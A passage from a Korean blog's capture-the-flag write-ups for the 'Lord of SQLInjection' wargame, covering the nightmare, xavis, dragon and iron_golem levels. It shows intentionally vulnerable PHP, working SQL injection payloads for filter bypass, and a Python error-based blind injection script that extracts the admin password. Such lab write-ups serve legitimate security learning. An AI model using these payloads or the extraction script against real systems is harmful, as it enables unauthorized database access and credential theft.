<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)|#|-/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[pw])&gt;<span class="number">6</span>) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_nightmare where pw=(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;) and id!=&#x27;admin&#x27;&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) solve(<span class="string">&quot;nightmare&quot;</span>);  </span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-해석"><a href="#1-줄-해석" class="headerlink" title="1 줄 해석"></a>1 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)|#|-/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링 할 때 사용합니다.</p>
<p><code>pw 파라미터</code>에서 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code>, <code>#</code>, <code>-</code> 를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="2-줄-해석"><a href="#2-줄-해석" class="headerlink" title="2 줄 해석"></a>2 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[pw])&gt;<span class="number">6</span>) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>strlen</code>함수는 인자로 들어온 문자의 개수를 숫자로 반환 해주는 함수입니다.</p>
<p>즉, <code>pw</code>의 길이가 6자 이상이라면 No Hack <del>_</del> 을 출력합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/nightmare/solve_1.png">

<br>

<p><code>pw</code> 파라미터를 참으로 만들어주면 문제가 풀립니다.</p>
<br>

<p>문자열과 숫자를 비교할 때 숫자 없이 문자로만 이루어진 문자열은 0으로 형 변환되는 것을 이용해 문제를 풀었습니다.</p>
<p>select id from porb_nightmare where pw=<code>(&#39;&#39;)=0</code></p>
<p>이처럼 <code>pw</code>를 참으로 만들어 주었습니다.</p>
<br>

<p><code>&#39;) and id!=&#39;admin&#39;</code>을 생략 해주어야 합니다.</p>
<p>주석은 <code>preg_match</code>함수로 필터링 되어있기 때문에 쿼리문을 끝내주는 <code>; (세미콜론)</code>과 <code>%00 (NULL)</code> 문자열을 이용하여 생략하였습니다.</p>
<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [19번_xavis] Write UP</title>
    <url>/2021/11/16/2021-11-16-Lord_of_SQLInjection_19_xavis/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>19번 문제인 xavis를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/xavis/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/regex|like/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_xavis where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_xavis where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;xavis&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/regex|like/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_xavis where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_xavis where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-2-줄-해석"><a href="#1-줄-2-줄-해석" class="headerlink" title="1 줄 ~ 2 줄 해석"></a>1 줄 ~ 2 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/regex|like/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);  </span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링 할 때 사용합니다.</p>
<p><code>pw 파라미터</code>에서 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code>, <code>regex</code>, <code>like</code> 를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="5-줄-해석"><a href="#5-줄-해석" class="headerlink" title="5 줄 해석"></a>5 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애 줍니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<p>Blind SQL Injection을 이용해서 풀 수 있는 문제라 코드를 짜고 돌렸는데도 답이 안 나왔습니다.</p>
<p>답을 찾아서 보니 <code>pw</code>가 한글이라 구하는 과정이 복잡했습니다.</p>
<br>

<p>여러가지를 찾아봤더니 코드를 돌리는 것보다 간단한 방법이 있었습니다.</p>
<br>

<p><code>UNION</code>과 <code>@local_variable</code>이라는 것을 사용하여 푸는 방법입니다.</p>
<p><code>@local_variable</code>은 어떠한 값을 할당하기 위해 선언하는 지역변수라고 나와있습니다. </p>
<p><a href="https://docs.microsoft.com/en-us/sql/t-sql/language-elements/select-local-variable-transact-sql?view=sql-server-2017">[MS 공식 문서]</a> 참조</p>
<br>

<br>

<p><code>SELECT @local_variable=&quot;admin&quot;</code></p>
<blockquote>
<p>위 쿼리문의 의미는 local_variable이라는 변수에 admin 값을 할당한다는 뜻 입니다.</p>
</blockquote>
<br>

<br>

<p><code>@local_variable</code>을 사용하여 <code>pw</code> 값을 변수에 할당해보면 아래와 같이 쿼리문을 사용하면 됩니다.</p>
<p><code>SELECT @pw:=pw WHERE id=&#39;admin&#39;</code></p>
<blockquote>
<p>pw 변수에 pw 값을 할당해줍니다.</p>
</blockquote>
<br>

<br>

<p>이제 <code>UNION</code>과 같이 사용해주면 <code>@pw</code> 변수에 할당된 <code>pw</code> 값이 출력됩니다.</p>
<p><code>?pw=&#39; or (SELECT @pw:=pw WHERE id=&#39;admin&#39;) UNION SELECT @pw#</code></p>
<br>

<br>

<img src="/images/Lord of SQLInjection/xavis/solve_1.png">

<br>

<br>

<blockquote>
<p>어렵…</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [20번_dragon] Write UP</title>
    <url>/2021/11/21/2021-11-21-Lord_of_SQLInjection_20_dragon/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>20번 문제인 dragon을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/dragon/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_dragon where id=&#x27;guest&#x27;# and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;dragon&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_dragon where id=&#x27;guest&#x27;# and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;dragon&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-해석"><a href="#1-줄-해석" class="headerlink" title="1 줄 해석"></a>1 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링 할 때 사용합니다.</p>
<p><code>pw 파라미터</code>에서 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code>를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="2-줄-4-줄-해석"><a href="#2-줄-4-줄-해석" class="headerlink" title="2 줄 ~ 4 줄 해석"></a>2 줄 ~ 4 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_dragon where id=&#x27;guest&#x27;# and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;dragon&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>쿼리문을 보면 <code>id</code>를 guest로 해주고 주석 처리 하는 것을 볼 수 있습니다.</p>
<p><code>id</code> 를 admin으로 만들어주면 문제가 풀립니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<p><code>#</code>은 한 줄 주석입니다. </p>
<p>즉, 다음 줄은 주석이 아닌 정상적인 쿼리문으로 작동 시킬 수 있습니다.</p>
<br>

<p><code>pw</code> 인자 부분에 <code>개행문자(%0a)</code>를 넣어 쿼리문을 완성 시키겠습니다.</p>
<p><code>select id from prob_dragon where id=&#39;guest&#39;</code><font color="green"><del># and pw=’’</del></font> <code>%0a and pw=&#39;1&#39; or id=&#39;admin&#39;%23&#39;</code> </p>
<p>위 쿼리문을 넣으면 우회가 됩니다.</p>
<br>

<br>

<p><code>select id from prob_dragon where id=&#39;guest&#39; </code><font color="green"><del># and pw=’’</del></font></p>
<p><code>and pw=&#39;1&#39; or id=&#39;admin&#39;#</code> </p>
<br>

<img src="/images/Lord of SQLInjection/dragon/solve_1.png">

<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [21번_iron_golem] Write UP</title>
    <url>/2021/11/25/2021-11-25-Lord_of_SQLInjection_21_iron_golem/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>21번 문제인 iron_golem를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/iron_golem/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_iron_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(mysqli_error(<span class="variable">$db</span>)) <span class="keyword">exit</span>(mysqli_error(<span class="variable">$db</span>));</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_iron_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;iron_golem&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_iron_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_iron_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;iron_golem&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-2-줄-해석"><a href="#1-줄-2-줄-해석" class="headerlink" title="1 줄 ~ 2 줄 해석"></a>1 줄 ~ 2 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>pw 파라미터</code>에서 <code>prob</code> <code>sleep</code> <code>benchmark</code>  <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="5-줄-해석"><a href="#5-줄-해석" class="headerlink" title="5 줄 해석"></a>5 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애 줍니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<p><code>pw</code> 값을 찾아야 하는 <code>Blind SQLi</code>입니다.</p>
<p>이전의 문제와 다른 점은 쿼리문이 참일 때 <code>Hello admin</code>와 같은 문자가 안 뜹니다.</p>
<br>

<p>즉, 참 거짓을 알 수 없기 때문에 <code>Error Based SQLi</code>를 사용해야 합니다.</p>
<p>참 / 거짓을 판별하기 위해 조건문을 사용하여 참이면 에러 발생 X, 거짓이면 에러를 발생 시키는 방법으로 판별할 수 있습니다.</p>
<br>

<p><code>if(조건, 참일 때 결과, 거짓일 때 결과)</code>를 사용해주면 됩니다.</p>
<br>

<p>if문 안에 서브 쿼리문인 <code>(SELECT 1 UNION SELECT 2)</code>를 넣어 에러를 발생시킵니다.</p>
<p>해당 쿼리문은 <code>row</code>가 두 개 생성되기 때문에 아래와 같이 에러가 발생합니다. (id 컬럼의 한 row에 두 개의 row를 삽입하려고 했기 때문에)</p>
<br>

<img src="/images/Lord of SQLInjection/iron_golem/solve_1.png">

<br>

<br>

<p>일단 <code>pw</code>의 길이를 구하기 위한 쿼리문은 아래와 같습니다.</p>
<p><code>&#39; or id=&#39;admin&#39; and if(length(pw)=&#39;&#123; i &#125;&#39;,1,(select 1 union select 2))%23</code></p>
<p><code>i</code> 값을 증가 시키면서 <code>pw</code>의 길이를 구해주면 됩니다.</p>
<br>

<br>

<p><code>pw</code>의 길이를 구하면 한 글자 씩 추출하여 패스워드를 찾으면 됩니다.</p>
<p><code>pw</code>를 찾기 위한 쿼리문은 아래와 같습니다.</p>
<p><code>&#39; or id=&#39;admin&#39; and if(substr(pw,&#123; i &#125;,1)=&#39;&#123; j &#125;&#39;,1,(select 1 union select 2))%23</code></p>
<p><code>substr</code> 함수로 한 글자 씩 추출하여 <code>pw</code>를 찾습니다.</p>
<br>

<br>

<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=&quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=값&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;&#x27; or id=&#x27;admin&#x27; and if(length(pw)=&#123;&#125;,1,(select 1 union select 2))%23&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Subquery&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        length += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;&#x27; or id=&#x27;admin&#x27; and if(substr(pw,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,1,(select 1 union select 2))%23&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">chr</span>(j))</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Subquery&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            pwd += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(i,<span class="string">&quot;번째 문자 찾는 중 .. : &quot;</span>,pwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pw : &quot;</span>,pwd)</span><br></pre></td></tr></table></figure>



<br>

<img src="/images/Lord of SQLInjection/iron_golem/solve_2.png">

<br>

<p><code>pw</code>의 길이를 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/iron_golem/solve_3.png">

<br>

<p><code>pw</code>를 한 글자 씩 추출하여 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/iron_golem/solve_4.png">

<br>

<p>찾은 <code>pw</code>를 패스워드에 넣어 풀어주면 됩니다.</p>
<p>** 파이썬에서 패스워드가 대문자로 추출됩니다. 그 이유는 MySQL에서는 대소문자 구분이 없기 때문에 아스키 코드가 더 작은 대문자로 추출됩니다. 소문자로 바꿔주어 넣어주면 됩니다.</p>
<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [22번_dark_eyes] Write UP</title>
